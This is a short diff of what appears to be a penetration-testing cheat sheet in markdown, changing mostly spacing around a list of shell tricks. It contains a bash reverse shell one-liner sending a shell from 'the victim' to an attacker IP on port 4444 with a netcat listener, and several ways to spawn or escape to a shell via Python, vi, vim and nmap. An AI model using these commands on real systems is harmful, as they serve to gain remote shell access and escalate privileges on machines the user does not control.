@@ -12,19 +12,25 @@ Plesse check below:
 PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
 **BASH**
-
 bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
 echo os.system('/bin/bash')
-OR
+OR        
+
 `/bin/sh -i`
-OR
+
+OR        
 :! /bin/bash
-OR
+
+OR        
 `':!bash':`   //from vim
-OR
+
+OR        
 `:!bash`    // from vi
-OR
+
+OR        
 `!sh`    //from nmap
+
+
 Plesse check below:
 -----
 `:set shell=/bin/bash:shell`
